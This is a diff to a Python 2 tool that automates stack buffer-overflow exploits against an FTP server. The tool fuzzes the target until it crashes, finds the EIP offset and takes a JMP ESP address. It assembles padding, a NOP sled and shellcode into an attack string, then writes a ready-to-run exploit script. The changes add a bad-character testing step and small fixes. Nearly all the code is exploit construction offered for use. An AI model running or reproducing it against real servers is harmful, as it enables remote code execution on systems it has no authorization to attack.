@@ -9,6 +9,8 @@ from shell_code import shell_code
 import fileinput
 from Banner import *
 import shutil
+import os
+import sys
 
 W='\033[0m'     
 R='\033[31m'    
@@ -16,10 +18,12 @@ G='\033[0;32m'
 O='\33[37m'     
 B='\033[34m'    
 P= '\033[35m'   
-Y="\033[1;33m"   
+Y="\033[1;33m" 
+  
+
 
 class Buffer_Over():
-    
+     
      def __init__(self):
             global W
             global R
@@ -29,13 +33,19 @@ class Buffer_Over():
             global P
             global Y          
             time.sleep(2)
-            print Y+"\n[A]"+W+R+"* Buffer_Helper Start Target FTP Server Mode  * "+W+Y+"[C]"+W
+            mode = """
+            ========================                          
+               Target FTP Server
+            ========================
+           """
+            print P+mode+W
             self.ip_port()
             self.Fuzzing__()
             self.string_ramdon()
             self.connect_servser()
             self.Option_return()
             self._hexadecimal() 
+            self.import_char()
             self.little_endian()        
             self.attack_all()
             self.auto_write()
@@ -65,7 +75,7 @@ class Buffer_Over():
                 elif self.Fuzzing_in ==self.Fuz_OPt and len(self.Fuzzing_in)==1:
                     String = "A"
 		    Fuzzer = 100
-		    print O+"\n>>>>"+W+R+"Fuzzing in process "+W 
+		    print O+"\n>>>>"+W+R+"Fuzzing in process "+W 		    
 		    try:
 		          try:
 		              while True: 
@@ -79,6 +89,9 @@ class Buffer_Over():
 				    Fuzzing_sock.close()
 				    length=(int(len(Buffer)))
 				    Fuzzer +=100
+				    print B+"###--> "+W,Fuzzer-100   
+                                    sys.stdout.write('\x1b[1A')
+                                    sys.stdout.write('\x1b[2K')
 			  except:
 		             if  Fuzzer > 100:                           
                                  print O+"\n>>>>>"+W+P+"Fuzzing Stop at " +W+Y+str(length)+W+ R+ " Characters"+W 
@@ -105,10 +118,12 @@ class Buffer_Over():
                     if self.Random_String  > 0:
                            self.connect_servser() 
                            self.Option_return()
-                           self._hexadecimal() 
+                           self._hexadecimal()
+                           self.import_char() 
                            self.little_endian()        
                            self.attack_all()
-                           self.auto_write()                                                                                                                                                             	                    
+                           self.auto_write()  
+                                                                                                                                                                                     	                    
 	        else:         
 	           time.sleep(2)    
                    print Y+"\n[-]"+W+R+"please Enter "+W+B+"'Y'"+W+R+"or"+W+B+"'S'"+W+Y+" [-]"+W 
@@ -178,10 +193,10 @@ class Buffer_Over():
                    print  Banner
                    exit()
                                
-     def _hexadecimal(self):
-                                                                                   
-          while True:
-                 try: 
+     def _hexadecimal(self):                                                                                    
+            while True:
+                 try:
+                                        
 		    self.hexadecimal =str(raw_input(O+"\n[+]"+W+B+"Enter Hexadecimal Crach address: "+W)).upper()
                     self.ASCII1 ="".join(reversed([self.hexadecimal[i:i+2] for i in range(0, len(self.hexadecimal), 2)]))                
 		    self.ASCII = ''.join(chr(int(self.ASCII1[i:i+2], 16)) for i in range(0, len(self.ASCII1), 2))
@@ -192,6 +207,7 @@ class Buffer_Over():
 		       self.location = self.Random_String.find(self.ASCII)		       
 		       print Y+"\n[+]"+W+P+"Exact Satch at Offset"+W+B+" : "+W,self.location	              
                        break
+                             
 		    else:
 	               print Y+"\n[(*)]"+W+R+"THE VALUE  OF THE ADDRESS Not FOUND  IN OUR STRING"+W+Y+"[(*)] "+W
 	               time.sleep(2)
@@ -204,8 +220,34 @@ class Buffer_Over():
 	        
                  except KeyboardInterrupt:
                        print  Banner
-                       exit() 
-         
+                       exit()
+     def import_char(self): 
+         try:
+            
+            Bad = "yes".lower()
+            Bad_no = "no".lower()                 
+            bad_op = str(raw_input(Y+"\n[<>]"+W+R+"To Test Bad_Character Enter "+W+B+"yes "+W+R +"To Skip Enter "+W+B+" no : "+W)).lower()
+            
+            if bad_op == Bad and len(Bad)==3: 
+                banner = """  
+                    ========================                          
+                      Bad_Character start
+                    ========================\n 
+                    """
+                print B+banner+W 
+                with open('.data','w')as data :
+                    data1 = data.write(self.server_ip+'\n'+str(self.server_port)+'\n'+str(self.location))         
+                time.sleep(2)
+                from Bad_Character import Bad_Character             
+                run = Bad_Character()
+            elif bad_op ==Bad_no and len(Bad_no)==2: 
+                pass
+            else:
+              print Y+"\n[-]"+W+R+"Please Enter "+W+B+"yes"+W+R+" or"+W+B+" no"+W+Y+" [-]"+W 
+              self.import_char()                   
+         except KeyboardInterrupt:
+                print  Banner
+                exit()                   
      def little_endian(self):       
                try:
                     jump= str(raw_input(O+"\n[+]"+W+B+" Enter JMP ESP addrsss HEX  : "+W)).upper()
@@ -237,7 +279,7 @@ class Buffer_Over():
                    self.NO_Operation = len(self.Random_String) - self.location  - len( self.jump_address)
                    self.NO_Operation =self.NO_Operation*"\x90"
                    self.count = self.NO_Operation.count("\x90")    
-                   attack = Start_string+self.jump_address+ self.NO_Operation +shell_code 
+                   attack = Start_string+self.jump_address+ self.NO_Operation +str(shell_code)
                    time.sleep(2)
                    print Y+'\n[+]'+W+B+' attack'+W+O+' ='+W,len(Start_string),B+'of'+W+R+ " A "+W+O+' + '+W+B+\
                    ' JMP ESP ='+W,Y+ self.display+W ,O+'+'+W,self.NO_Operation.count("\x90"),B+'of'+W+R+'("\\x90")'+W+O +'+'+W+P+' shell code'+W
@@ -268,7 +310,7 @@ class Buffer_Over():
      def auto_write(self): 
               
                 try:                
-                  shell =shell_code.encode("hex")
+                  shell =str(shell_code).encode("hex")
                   shell1= "".join("\\x%s"%shell[i:i+2] for i in range(0, len(shell), 2))
                   self.shell_code= "".join('\n"%s"'%shell1[i:i+56] for i in range(0, len(shell1),56))
                   copy_format= shutil.copy("./FTP.Server_payload.txt","./FTP.Server_payload.py") 
@@ -277,27 +319,22 @@ class Buffer_Over():
                   for line in fileinput.FileInput(file,inplace=1):
 	                if '# application name :'in line:
 		            line = line.rstrip()
-		            line = line.replace(line,line+ self.data_recv +'\n')
-				 
+		            line = line.replace(line,line+ self.data_recv +'\n')				 
 	                if '_Offset_Byte  =  "A"*'in line:
 		            line = line.rstrip()
-		            line = line.replace(line,line+ str(self.location)+'\n')
-				 
+		            line = line.replace(line,line+ str(self.location)+'\n')				 
 		        if '_JMP_ESP      ='in line:
 		            line = line.rstrip()
-		            line = line.replace(line,line+'"'+ self.display+'"'+'\n')
-				 
+		            line = line.replace(line,line+'"'+ self.display+'"'+'\n')				 
 	                if '_NO_OPT       = "\\x90"'in line:
 		            line = line.rstrip()
 		            line = line.replace(line,line+ str(self.count) +'\n')
 		        if '_Shell_Code   = ('in line:
 		             line = line.rstrip()
-		             line = line.replace(line,line+ self.shell_code+ ')'+'\n')
-			     
+		             line = line.replace(line,line+ self.shell_code+ ')'+'\n')			     
 		        if 'ip_address ='in line:
 		            line = line.rstrip()
-			    line = line.replace(line,line+'"'+self.server_ip+'"'+"\n")
-				 
+			    line = line.replace(line,line+'"'+self.server_ip+'"'+"\n")				 
 		        if 'connect_Port ='in line:
 		            line = line.rstrip()
 		            line = line.replace(line,line+ str(self.server_port)+'\n')  
@@ -316,8 +353,3 @@ class Buffer_Over():
 		          
 if __name__ == '__main__':
    Buffer_Over()
-
-
-
-
-
